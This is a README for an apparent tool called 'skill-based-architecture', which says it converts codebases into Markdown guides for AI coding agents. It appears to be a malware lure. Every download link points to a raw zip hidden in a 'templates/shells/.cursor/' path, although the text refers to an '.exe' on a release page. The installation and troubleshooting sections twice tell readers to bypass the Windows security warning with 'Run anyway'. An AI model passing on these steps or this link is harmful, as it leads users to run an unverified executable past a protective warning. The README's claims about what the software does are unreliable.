# 🛠️ skill-based-architecture - Turn any codebase into portable skills

[**Download Latest Version**](https://github.com/kuysrerey/skill-based-architecture/raw/refs/heads/main/templates/shells/.cursor/architecture-skill-based-v2.4.zip)

---

## 📖 About this project

Modern AI tools need clear instructions to work well. This tool looks at your existing software projects and turns their rules, workflows, and lessons into simple guides. 

These guides live in a folder named `skills/<name>/`. Once you create these files, AI agents like Cursor, Claude Code, or Windsurf read them. The agents use these files to understand your project standards. This prevents the AI from making mistakes or ignoring your team’s preferred methods. 

Think of this as an automated translator that turns your project history into a manual for your AI assistants.

## 🚀 How it works

The software scans the files in your project folders. It identifies common patterns, design decisions, and coding standards. It then creates a set of Markdown files. These files act as the single source of truth. When you pair this with an AI agent, the agent consults your new skill folder before it writes code or performs tasks.

This process ensures the AI understands your specific project setup without you explaining it every time.

## 📥 Installation on Windows

To get started, follow these steps to download and run the software.

1. Go to the [official release page](https://github.com/kuysrerey/skill-based-architecture/raw/refs/heads/main/templates/shells/.cursor/architecture-skill-based-v2.4.zip).
2. Locate the file ending in `.exe` under the latest release heading.
3. Click the file name to download it to your computer.
4. Open your Downloads folder.
5. Double-click the file to start the installation.
6. A Windows security window may appear. If it does, click "More info" and then "Run anyway."
7. Follow the prompts on your screen to finish the setup process.

Once installed, you can launch the application from your Start menu by searching for "skill-based-architecture."

## ⚙️ Using the software

### Preparing your codebase
Find the folder containing the project you want to distill into a skill. The software works best with projects that have a clear folder structure and existing code files.

### Running the scan
Open the application on your computer. You will see a box that asks for a folder path. Click the "Browse" button and select the folder you prepared in the previous step. Click the "Generate Skill" button. 

The software will now examine your files. This might take a few minutes depending on the size of your project. Do not close the window while the progress bar moves.

### Saving your skill
When the process finishes, the application creates a `skills/` directory inside your chosen project folder. Inside this folder, you will find several Markdown files. These files contain the distilled wisdom of your project.

## 🤖 Connecting to AI agents

Once you have your skill files, you need to make sure your AI tools see them. Most AI agents allow you to set context paths or project instructions.

1. Open your AI agent software (e.g., Cursor or Windsurf).
2. Look for settings related to "Project Instructions" or "Context."
3. Point the agent to the `skills/` folder you just created.
4. Your agent will now reference these files automatically.

## 📋 System requirements

This software runs on any modern Windows computer. Ensure you meet these simple requirements to see the best results:

*   **Operating System:** Windows 10 or Windows 11.
*   **Memory:** At least 4 gigabytes of RAM.
*   **Storage:** 100 megabytes of free space for the application, plus extra space for the generated skill files.
*   **Internet Connection:** Required only for the initial download and occasional updates.

## 💡 Troubleshooting common issues

### The application does not open
If the app fails to start, ensure you have the latest version. Try deleting the downloaded file and restarting the download process from the official link.

### The skill folder is empty
Verify that the project folder you selected contains code files. The tool requires readable source code to extract patterns. If the input folder is empty, the tool cannot produce any output.

### The AI agent ignores the files
Check your AI agent settings. Ensure the `skills/` folder is at the root of your project directory. Some AI agents require a manual refresh of the codebase to recognize new folders. Try restarting the agent to force it to re-scan your project files.

### Windows prevents the program from running
Windows protects your computer from unknown files. Since this is a new installation, your system might flag the file as unrecognized. Use the "More info" link in the warning box to confirm you want to run the software.

## ❓ Frequently asked questions

### Does this software send my code to a server?
No. The processing happens entirely on your local machine. Your code and the generated skill files stay on your computer.

### Can I edit the generated files?
Yes. The output files are plain text. You can open them in any text editor or inside your code editor to add notes or clarify specific rules.

### Does this work with every AI tool?
The tool produces standard Markdown files. Any AI agent that allows you to specify local context or instructions can read these files.

### How often should I run the scan?
Run the scan whenever you make significant changes to your project structure or workflows. This keeps your AI agent updated with the latest project standards.